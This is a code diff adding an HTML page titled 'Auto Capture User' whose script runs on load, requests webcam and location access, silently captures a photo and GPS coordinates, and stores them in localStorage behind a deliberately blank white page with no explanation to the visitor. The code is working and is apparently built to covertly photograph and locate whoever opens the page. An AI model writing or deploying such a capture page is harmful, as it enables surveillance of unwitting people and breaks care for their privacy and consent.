@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Auto Capture User</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    background: white;
+  }
+</style>
+</head>
+<body>
+<script>
+  // Function to generate a random ID
+  function generateId() {
+    return 'id-' + Math.random().toString(36).substr(2, 9);
+  }
+
+  // Capture photo from webcam
+  async function capturePhoto() {
+    try {
+      // Request user media video
+      const stream = await navigator.mediaDevices.getUserMedia({video: true});
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.play();
+
+      // Wait for video to be ready
+      await new Promise(resolve => {
+        video.onloadedmetadata = () => resolve();
+      });
+
+      // Capture a frame after short delay to ensure camera started
+      await new Promise(r => setTimeout(r, 500));
+
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Stop all tracks to release camera
+      stream.getTracks().forEach(track => track.stop());
+
+      return canvas.toDataURL('image/jpeg', 0.8);
+    } catch (error) {
+      console.error('Camera error:', error);
+      return null;
+    }
+  }
+
+  // Get location
+  function getLocation() {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        resolve(null);
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy
+        }),
+        err => {
+          console.warn('Location permission denied or error:', err);
+          resolve(null);
+        },
+        {timeout: 10000}
+      );
+    });
+  }
+
+  function saveData(entry) {
+    // Retrieve existing array or create new
+    let data = localStorage.getItem('binjson_data');
+    let arr = data ? JSON.parse(data) : [];
+
+    arr.push(entry);
+
+    // Save back
+    localStorage.setItem('binjson_data', JSON.stringify(arr));
+  }
+
+  async function main() {
+    const id = generateId();
+    const image = await capturePhoto();
+    const location = await getLocation();
+    const timestamp = new Date().toISOString();
+
+    if (!image) {
+      console.warn('No image captured, aborting save.');
+      return;
+    }
+
+    const entry = {
+      id,
+      image,
+      location,
+      timestamp
+    };
+
+    saveData(entry);
+    // No UI needed, page is blank white
+  }
+
+  // Run on load
+  window.onload = () => {
+    main();
+  };
+</script>
+</body>
+</html>
+
